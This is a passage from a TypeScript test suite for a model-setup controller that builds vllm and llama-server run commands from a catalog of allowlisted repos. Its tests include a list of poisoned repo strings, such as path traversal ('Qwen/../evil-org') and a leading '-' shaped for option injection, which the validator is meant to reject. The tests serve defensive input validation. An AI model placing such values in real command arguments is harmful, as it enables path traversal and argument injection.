      'vllm serve sweepai/sweep-next-edit-v2-7B',
    );
  });
});

describe('T6 (SC-2): the serveRepo compose-time gate — poisoned fixture ⇒ ABSENCE, never a shelled bad source', () => {
  const base = catalogRow('qwen25-coder-1.5b');

  it('the two VLLM_ONLY_SERVE_REPOS exception rows DO compose (ledgered exceptions)', () => {
    expect(composeVllmCell(catalogRow('gpt-oss-20b'))).toEqual({ runCommand: 'vllm serve openai/gpt-oss-20b' });
    expect(composeVllmCell(catalogRow('sweep-next'))).toEqual({
      runCommand: 'vllm serve sweepai/sweep-next-edit-v2-7B',
    });
  });

  it('an allowlisted-publisher serveRepo composes', () => {
    expect(composeVllmCell(base)).toEqual({ runCommand: 'vllm serve Qwen/Qwen2.5-Coder-1.5B' });
  });

  const POISONED = [
    'Qwen/../evil-org', // '..' traversal — charset kills it BEFORE any membership check
    '-Qwen/x', // leading '-' (option-injection shape)
    ':Qwen/x', // leading ':'
    'Qwen//x', // empty segment
    'Qwen/x/y', // more than one '/'
    'Qwen/x y', // whitespace
    'openai/../gpt-oss-20b', // traversal near an exception entry — still absence
  ];
  for (const serveRepo of POISONED) {
    it(`poisoned '${serveRepo}' ⇒ the vllm cell is ABSENT`, () => {
      expect(composeVllmCell({ ...base, vllm: { serveRepo } })).toBeUndefined();
    });
  }

  it('charset-clean but neither allowlisted nor a ledgered exception ⇒ ABSENT (the closure invariant)', () => {
    expect(composeVllmCell({ ...base, vllm: { serveRepo: 'bartowski/some-model' } })).toBeUndefined();
  });

  it('a row with no vllm offering ⇒ absent', () => {
    const { vllm: _vllm, ...noVllm } = base;
    expect(composeVllmCell(noVllm)).toBeUndefined();
  });
});

describe('T6 (§2.2.8): llamacpp cell — runCommand ONLY for attested-present files', () => {
  async function statusWithPresence(
    present: ReadonlyMap<string, boolean>,
    extra: Partial<SetupControllerDeps> = {},
  ): Promise<Awaited<ReturnType<SetupController['status']>>> {
    const { controller } = makeController({}, { scanStorePresence: async () => present, ...extra });
    return controller.status();
  }

  it('present (sidecar-attested by the scan) ⇒ runCommand with the ~-redacted dest, FIM port 8080', async () => {
    const data = await statusWithPresence(new Map([['qwen25-coder-1.5b', true]]));
    const row = data.catalog?.models.find((m) => m.id === 'qwen25-coder-1.5b');
    expect(row?.llamacpp?.present).toBe(true);
    expect(row?.llamacpp?.runCommand).toBe(
      'llama-server -m ~/.local/share/talaria/models/ggml-org/Qwen2.5-Coder-1.5B-Q8_0-GGUF/qwen2.5-coder-1.5b-q8_0.gguf --port 8080',
    );
  });

  it('role flag table (§2.5): embedding --embeddings 8081 · agent --jinja 8013 · NEXT 8012', async () => {
    const data = await statusWithPresence(
      new Map([
        ['qwen3-embedding-0.6b', true],
        ['devstral-24b', true],
        ['sweep-next', true],
      ]),
    );
    const models = data.catalog?.models ?? [];
    expect(models.find((m) => m.id === 'qwen3-embedding-0.6b')?.llamacpp?.runCommand).toBe(
      'llama-server -m ~/.local/share/talaria/models/Qwen/Qwen3-Embedding-0.6B-GGUF/Qwen3-Embedding-0.6B-Q8_0.gguf --embeddings --port 8081',
    );
    expect(models.find((m) => m.id === 'devstral-24b')?.llamacpp?.runCommand).toBe(
      'llama-server -m ~/.local/share/talaria/models/mistralai/Devstral-Small-2507_gguf/Devstral-Small-2507-Q4_K_M.gguf --jinja --port 8013',
    );
    expect(models.find((m) => m.id === 'sweep-next')?.llamacpp?.runCommand).toBe(
      'llama-server -m ~/.local/share/talaria/models/SyntinalCo/sweep-next-edit-v2-7B-GGUF/sweep-next-edit-v2-7B-Q4_K_M.gguf --port 8012',
    );
  });

  it('absent ⇒ NO runCommand', async () => {
    const data = await statusWithPresence(new Map());
    expect(data.catalog?.models.every((m) => m.llamacpp?.runCommand === undefined)).toBe(true);
  });

  it('present but the store dest cannot be composed ⇒ NO runCommand (fail-closed)', async () => {
    const data = await statusWithPresence(new Map([['qwen25-coder-1.5b', true]]), {
      storeDest: () => ({ ok: false, reason: 'no store root' }),
    });
    const row = data.catalog?.models.find((m) => m.id === 'qwen25-coder-1.5b');
    expect(row?.llamacpp?.present).toBe(true);
    expect(row?.llamacpp?.runCommand).toBeUndefined();
  });

  it('composeLlamacppCell: a poisoned gguf source (charset) ⇒ honest absence — available:false + §6 copy, NEVER a runCommand', () => {
    const base = catalogRow('qwen25-coder-1.5b');
    const poisoned: CatalogModel = {
      ...base,
      llamacpp: {
        gguf: { hfRepo: 'ggml-org/../evil', file: 'x.gguf', quant: 'Q8_0', approxBytes: 1 },
        verify: { mode: 'live-oid' },
      },
    };
    expect(composeLlamacppCell(poisoned, true, '~/anywhere/x.gguf')).toEqual({
      file: 'x.gguf',
      approxBytes: 1,
      present: false,
      available: false,
      unavailableReason: LLAMACPP_HONEST_ABSENCE_COPY,
    });
  });

  it('composeLlamacppCell: a non-allowlisted gguf publisher ⇒ the same honest absence (triple-allowlist mirror)', () => {
    const base = catalogRow('qwen25-coder-1.5b');
    const foreign: CatalogModel = {
      ...base,
      llamacpp: {
        gguf: { hfRepo: 'bartowski/some-GGUF', file: 'x.gguf', quant: 'Q8_0', approxBytes: 1 },
        verify: { mode: 'live-oid' },
      },
    };
    expect(composeLlamacppCell(foreign, false, undefined)?.unavailableReason).toBe(LLAMACPP_HONEST_ABSENCE_COPY);
  });

  it('composeLlamacppCell: a pinned row with a PUBLISHED pin is available (the flag tracks the pin, not the mode)', () => {
    const base = catalogRow('sweep-next');
    if (!base.llamacpp) throw new Error('sweep-next must carry a llamacpp cell');
    const published: CatalogModel = {
      ...base,
      llamacpp: { gguf: base.llamacpp.gguf, verify: { mode: 'pinned', sha256: 'a'.repeat(64) } },
    };
    expect(composeLlamacppCell(published, false, undefined)?.available).toBe(true);
  });
});

describe('T6 (CC-2): setup.testRemote result widening — {ok:true, models} when the probe carries them', () => {
  it('models pass through', async () => {
    const { controller } = makeController(
      {},
      { probeRemote: async () => ({ ok: true, detail: 'ok', models: ['served-a', 'served-b'] }) },
    );
    const result = await controller.handle('setup.testRemote', { backendId: 'ollama' });
    expect(result).toEqual({ ok: true, models: ['served-a', 'served-b'] });
  });

  it('stays EXACTLY {ok:true} when the probe has no models (existing callers unaffected)', async () => {
    const { controller } = makeController({}, { probeRemote: async () => ({ ok: true, detail: 'ok' }) });
    const result = await controller.handle('setup.testRemote', { backendId: 'ollama' });
    expect(result).toEqual({ ok: true });
  });
});
